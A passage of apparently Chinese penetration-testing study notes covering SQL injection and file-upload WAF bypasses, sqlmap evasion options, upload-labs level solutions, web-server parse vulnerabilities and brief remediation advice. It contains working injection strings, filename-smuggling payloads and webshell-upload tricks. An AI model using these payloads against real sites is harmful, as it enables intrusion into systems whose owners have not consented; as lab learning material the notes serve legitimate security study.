class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>A<span class="comment">/*!select 1,2,3*/</span>;<span class="operator">%</span><span class="number">23</span> </span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>Aselect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">*</span><span class="operator">/</span>;<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666361574697.png" alt="1666361574697"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--   参数污染		特殊符号</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/**&amp;id=-1%20union%20select%201,2,3%23*/</span></span><br><span class="line">安全狗能看到id<span class="operator">=</span><span class="number">1</span>			安全狗也是编程语言写的，后面被注释掉了</span><br><span class="line">php $_GET参数污染只能看到后面</span><br><span class="line">mysql 接着传</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*!select * from users*/</span> ;		#正常执行</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/***/</span>;							#没有<span class="keyword">sql</span>语句执行</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/**select * from users*/</span> ;		#没有<span class="keyword">sql</span>语句执行</span><br><span class="line"></span><br><span class="line">搜索参数污染</span><br><span class="line">url:	<span class="operator">/</span><span class="operator">/</span>....<span class="operator">/</span>index.php?y<span class="operator">=</span><span class="number">12</span>$y<span class="operator">=</span><span class="number">3</span></span><br><span class="line">php<span class="operator">/</span>apache		$_GET(&quot;par&quot;)					<span class="keyword">Last</span></span><br><span class="line">jsp<span class="operator">/</span>tomcat		Request.getParameter(&quot;par&quot;)		<span class="keyword">First</span></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">下图数据库版本<span class="number">2.00</span><span class="number">.00</span>以上可以执行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1%20union%20/*!44509select*/%201,2,3%23</span><br><span class="line">id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23</span><br><span class="line">%20</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666402908357.png" alt="1666402908357"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuzz	模糊测试		爆破测试？</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666365313754.png" alt="1666365313754"></p>
<h3 id="day19-SQL注入之SQLMAP绕过WAF"><a href="#day19-SQL注入之SQLMAP绕过WAF" class="headerlink" title="day19-SQL注入之SQLMAP绕过WAF"></a>day19-SQL注入之SQLMAP绕过WAF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.白名单</span><br><span class="line">	方式一：IP白名单		实战中意义不大</span><br><span class="line">        从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip这样就可能存在伪造IP绕过的情况</span><br><span class="line">        测试方法 	修改http的header来bypass</span><br><span class="line">        X-forward-for</span><br><span class="line">        X-remote-IP</span><br><span class="line">        X-originating-IP</span><br><span class="line">        x-remote-addr</span><br><span class="line">        X-Real-ip</span><br><span class="line">	方式二：静态资源		老版本用的多</span><br><span class="line">		特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求</span><br><span class="line">		.../index.php/1.js?id=1		参数还是给的.php文件</span><br><span class="line">	方式三：url白名单</span><br><span class="line">		为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符出，就作为白名单不进行检测。</span><br><span class="line">	方式四：爬虫白名单	伪造成搜索引擎访问</span><br><span class="line">		部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种</span><br><span class="line">		1.UserAgent		2.通过行为来判断</span><br><span class="line">		User Agent Switcher (Firefox 附加组件)，下载地址:</span><br><span class="line">			https://addons.mozilla.org.........................</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用sqlmap的tample模块，仿写sp_password.py模块到zz_rdog.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666406885817.png" alt="1666406885817"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">命令行：			还是不能注入</span><br><span class="line">	python sqlmap.py -u &quot;...../?id=1&quot; --tample=zz_rdog.py</span><br><span class="line">	sqlmap使用代理</span><br><span class="line">	python sqlmap.py -u &quot;...../?id=1&quot; --tample=zz_rdog.py --proxy=http://192.168.88.1:8080</span><br><span class="line">	发现useragent包含sqlmap		可以从安全狗防护日志发现拦截原因	http检测规则包含工具拦截</span><br><span class="line">	python sqlmap.py -u &quot;...../?id=1&quot; --tample=zz_rdog.py --random-agent</span><br><span class="line">	--random-agent从字典随机生成agent		也可以转成搜索引擎的对付cc攻击</span><br><span class="line">	--delay		加入延迟</span><br><span class="line">	对比使不使用安全狗抓包获得数据</span><br></pre></td></tr></table></figure>

<h3 id="day20-文件上传基础及过滤方式"><a href="#day20-文件上传基础及过滤方式" class="headerlink" title="day20-文件上传基础及过滤方式"></a>day20-文件上传基础及过滤方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用思路</span><br><span class="line">	解析漏洞 		iis apache nginx</span><br><span class="line">	常规思路		扫描获取上传 会员中心上传 后台系统上传 各种途径上传</span><br><span class="line">	CMS类		  已知CMS源码</span><br><span class="line">	编辑器类 		ckeditor fckeditor kindeditor xxxxeditor ueditor</span><br><span class="line">	其他类/CVE 	 代码审计 平台/三方应用等</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">谷歌搜索	inurl:upload.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解析漏洞</span><br><span class="line">	网站在解析url出现混乱</span><br><span class="line">	vulhub		nginx/nginx_parsing_vulnerability</span><br><span class="line">		属于用户配置不当造成的解析漏洞</span><br><span class="line">	http://your-ip/uploadfiles/nginx.png</span><br><span class="line">	http://your-ip/uploadfiles/nginx.png/.php		#网站解析这个路径的代码??</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload-labs		</span><br><span class="line">	第一关 	前端验证</span><br><span class="line">		1.禁用js脚本</span><br><span class="line">		2.burp抓改后缀</span><br><span class="line">	可以把网页代码复制过来改，首先把js代码注释掉，然后提交表单的地方添加action=&quot;http://192.168.88.1/upload-labs/Pass-01/index.php&quot;否则默认提交到原php文件，详情见/upload-labs/Pass-01/test.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 任意文件上传漏洞（CVE-2018-2894）</span><br><span class="line">	weblogic/CVE-2018-2894</span><br><span class="line">		这个账号密码是假定自己知道的可以通过在虚拟机执行docker-compose logs | grep password</span><br><span class="line">	按照他的操作步骤来，这种感觉只能代码审计，最后是jsp的木马没成功。。。。。</span><br></pre></td></tr></table></figure>

<h3 id="day21-文件上传之后端黑白名单绕过"><a href="#day21-文件上传之后端黑白名单绕过" class="headerlink" title="day21-文件上传之后端黑白名单绕过"></a>day21-文件上传之后端黑白名单绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常见黑名单 明确不允许上传的格式后缀</span><br><span class="line">	asp	php	jsp	aspx cgi war</span><br><span class="line">php5 Phtml定义不完整绕过</span><br><span class="line">常见白名单 明确可以上传的文件格式后缀</span><br><span class="line">	jpg	png zip rar gif</span><br><span class="line">文件类型 MIME</span><br><span class="line">	Content-Type：image/gif</span><br><span class="line">文件头 内容信息</span><br><span class="line">	txt打开gif文件 Gif89a</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span> onsubmit=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">    &lt;input <span class="class"><span class="keyword">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;上传&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">#<span class="title">onsubmit</span>鼠标触发事件</span></span><br><span class="line"><span class="class">#<span class="title">php</span>中使用$<span class="title">_FILES</span>接受文件上传		此处为$<span class="title">_FILES</span>[&quot;<span class="title">upload_file</span>&quot;]</span></span><br><span class="line"><span class="class">	$<span class="title">_FILES</span>[&quot;<span class="title">upload_file</span>&quot;][&quot;<span class="title">name</span>&quot;]		显示文件名</span></span><br><span class="line"><span class="class">    $<span class="title">_FILES</span>[&quot;<span class="title">upload_file</span>&quot;][&quot;<span class="title">type</span>&quot;]		显示<span class="title">MIME</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//学英文		deny拒绝   ext后缀</span></span><br><span class="line"><span class="comment">//upload-labs  第三关 	黑名单		用php5绕过			特殊解析后缀</span></span><br><span class="line">	<span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点		#不是内置的函数</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line">apache服务器 httpd.conf配置文件，添加php3和phtml取消前面的注释，保存并推出</span><br><span class="line">    AddType application/x-httpd-php .php .phtml .txt .php3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#	创建.htaccess文件		匹配文件名cimer 下面这个是MIME 以php格式执行</span><br><span class="line">#	upload-labs	第4关</span><br><span class="line">&lt;FilesMatch &quot;cimer&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第5关换后缀大小写</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第6关抓包改文件名filename加空格	带空格的文件后缀在php绕过黑名单，然后再windows或linux保存会自动把这个空格删掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第7关	抓包 少了删除文件末尾的点	同上关后缀的.绕过php 在保存在windows或者linux系统自动删掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 	upload-labs 第8关	少了替换&quot;::$DATA&quot;</span><br><span class="line">	抓包改filename=&quot;phpinfo.php::$DATA&quot;</span><br><span class="line">	windows会把这个::$DATA之后的数据当作文件流处理，在保存时自动去掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第9关		代码没有循环过滤点和空格	主要是验证file_ext 	要保证后两个点之间有空格</span><br><span class="line">	抓包改filename=&quot;cmd.php. .&quot;	&quot;cmd.php.. .&quot;	&quot;cmd.php..  .&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#	upload-labs 第10段		循环过滤</span><br><span class="line">	$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">	filename=&quot;cmd.pphphp&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	白名单</span></span><br><span class="line"><span class="string">		MIME绕过	</span></span><br><span class="line"><span class="string">		%00截断		url编码</span></span><br><span class="line"><span class="string">		0x00截断		16进制</span></span><br><span class="line"><span class="string">		0x0a截断</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	upload-labs 第11关		白名单		%00截断</span></span><br><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">	抓包改请求行save_path=../upload-&gt;save_path=../upload/cmd.php%<span class="number">00</span>	传cmd.jpg里面写一句话木马</span><br><span class="line">	该过php版本，依然有问题可能是题<span class="number">12</span>的问题</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666526282632.png" alt="1666526282632"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	upload-labs 第12关		白名单		这个是post请求save_path</span></span><br><span class="line">注意此处%<span class="number">00</span>选中右键按如下点</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666527382840.png" alt="1666527382840"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据包的编码，除了请求头（url）是用部分编码部分不编码的方式比如空格用%20而数字英文字母不编码，其他正常显示给我们看的数据包都应该是未被编码的内容，比如说我需要截断符%00，写在get就不用动它，默认编过了码，写在post就需要先解码了</span><br></pre></td></tr></table></figure>

<h3 id="day22-文件上传之内容逻辑数组绕过"><a href="#day22-文件上传之内容逻辑数组绕过" class="headerlink" title="day22-文件上传之内容逻辑数组绕过"></a>day22-文件上传之内容逻辑数组绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload-labs	第13关</span></span><br><span class="line">windows cmd制作图片码（验证文件内容）			copy /?可查看帮助		</span><br><span class="line">	copy icon_bp.png /b + cmd.php /a img_shell.png</span><br><span class="line">    /a表示ascii文本		/b表示二进制文件</span><br><span class="line">    上传完可以知道保存位置		文件包含被包含文件被当作php文件执行</span><br><span class="line">    http:<span class="comment">//192.168.88.1/upload-labs/include.php?file=/upload/4220221023152308.png</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload-labs	14关		验证必须上传图像</span></span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>)</span><br><span class="line"><span class="comment"># upload-labs   15关		</span></span><br><span class="line">php内置函数获取图片类型		exif_imagetype</span><br><span class="line"><span class="comment"># upload-labs   16关	</span></span><br><span class="line"><span class="title function_ invoke__">imagecreatefromjpeg</span>() 返回一图像标识符，代表了从给定的文件名取得的图像</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload-labs   17关			二次渲染</span></span><br><span class="line"><span class="comment">#move_upload_file文件已经到了服务器才做过滤</span></span><br><span class="line"><span class="comment">#	使用条件竞争		抓包intruder发11111次然后浏览器不停访问/upload-labs/upload/cmp.php访问成功但是有效事件很多，后面rename操作和浏览器访问冲突了</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666582542947.png" alt="1666582542947"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CVE-2017-12615			Tomcat中间件文件上传		上面的都是网站代码层面，中间件不同于php代码层面</span></span><br><span class="line">	按照教程做复制，然后一个是burp的http/<span class="number">1.1</span>点了发送之后变成http/<span class="number">2</span>,post请求那一栏格式也变了，不知为何?????</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#	解析漏洞</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666626845217.png" alt="1666626845217"></p>
<h3 id="day23-文件上传之解析漏洞编辑器安全"><a href="#day23-文件上传之解析漏洞编辑器安全" class="headerlink" title="day23-文件上传之解析漏洞编辑器安全"></a>day23-文件上传之解析漏洞编辑器安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php.ini可以改开放端口</span><br><span class="line"></span><br><span class="line">apache</span><br><span class="line">    低版本apache漏洞	2.x		/123.php.xxx		被当作php文件执行</span><br><span class="line">        利用场景：文件上传</span><br><span class="line">    Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span><br><span class="line">        抓包1.php后面先加空格，然后在hex模式改成20改0A</span><br><span class="line"></span><br><span class="line">nginx</span><br><span class="line">	Nginx 解析漏洞复现</span><br><span class="line">		上传图片码，会返回保存路径---&gt;&gt;.jpg/.php		当作php文件执行</span><br><span class="line">	Nginx文件名逻辑漏洞 CVE-2013-4547</span><br><span class="line"></span><br><span class="line">编辑器</span><br><span class="line">	fckeditor		搜漏洞利用</span><br><span class="line"></span><br><span class="line">CMS</span><br><span class="line">	通达OA系统</span><br><span class="line"></span><br><span class="line">https://navisec.it/编辑器漏洞手册</span><br><span class="line">https:/www.jb51.net/softs/75619.html</span><br><span class="line">https://pan.baidu.com/share/init?surl=5gcdBuOFrN1F9xVN7Q7GSA  **enqx**</span><br><span class="line"></span><br><span class="line">第一步是看中间件版本查看是否有解析漏洞</span><br></pre></td></tr></table></figure>

<h3 id="day24-文件上传之WAF绕过及安全修复"><a href="#day24-文件上传之WAF绕过及安全修复" class="headerlink" title="day24-文件上传之WAF绕过及安全修复"></a>day24-文件上传之WAF绕过及安全修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">上传参数名解析：</span><br><span class="line">	Content-Disposition:	一般不可更改</span><br><span class="line">	name:					表单参数值，不能更改</span><br><span class="line">	filename: 				文件名，可以更改</span><br><span class="line">	Content-Type: 			文件MIME，是情况更改</span><br><span class="line">安全狗常见绕过方法</span><br><span class="line">	数据溢出-防匹配(xxx...)</span><br><span class="line">		加大量垃圾数据在post请求的两个键值对之间，用;划分</span><br><span class="line">	符号变异-防匹配(&#x27; &quot; ;)</span><br><span class="line">	数据截断-防溢出(%00 ; 换行)</span><br><span class="line">	重复数据-防匹配(参数多次)</span><br><span class="line"></span><br><span class="line">#Payload :</span><br><span class="line">大量垃圾数据缓冲溢出(Ccontent-Disposition,filename等)</span><br><span class="line"></span><br><span class="line">#单引号、双引号、分号</span><br><span class="line">filename=x.php</span><br><span class="line">filename=&quot;x.php</span><br><span class="line">filename=&#x27;x.php</span><br><span class="line">filename=&quot;a.jpg;.php&quot;;</span><br><span class="line"></span><br><span class="line"># %00、换行</span><br><span class="line">filename=&quot;a.php%00.jpg&quot;</span><br><span class="line">filename=&quot;Content-Disposition : form-data;name=&quot;upload_file&quot; ; x.php&quot;</span><br><span class="line">filename=&quot;x.jpg&quot; ; filename=&quot;x.jpg&quot; ; . . . ..filename=&quot;x.php&quot;;</span><br><span class="line">filename=</span><br><span class="line">&quot;</span><br><span class="line">x</span><br><span class="line">.</span><br><span class="line">p</span><br><span class="line">h</span><br><span class="line">p</span><br><span class="line">&quot;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">#fuzz资源</span><br><span class="line">    https://github.com/fuzzdb-project/fuzzdb</span><br><span class="line">    https://github.com/TheKingOfDuck/fuzzDicts</span><br><span class="line">    </span><br><span class="line">#文件上传安全修复方案</span><br><span class="line">后端验证:采用服务端验证模式后缀检测:</span><br><span class="line">基于黑名单，白名单过滤MIME检测:</span><br><span class="line">基于上传自带类型检测</span><br><span class="line">内容检测:文件头，完整性检测</span><br><span class="line"></span><br><span class="line">自带函数过滤:参考uploadlabs函数</span><br><span class="line">自定义函数过滤:function check_file()&#123; &#125;</span><br><span class="line">WAF防护产品:宝塔,云盾,安全公司产品等</span><br></pre></td></tr></table></figure>

<h3 id="day25-XSS跨站之原理分类及攻击手法"><a href="#day25-XSS跨站之原理分类及攻击手法" class="headerlink" title="day25-XSS跨站之原理分类及攻击手法"></a>day25-XSS跨站之原理分类及攻击手法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HTML DOM树</span><br><span class="line">	根元素&lt;html&gt;</span><br><span class="line">		&lt;head&gt;</span><br><span 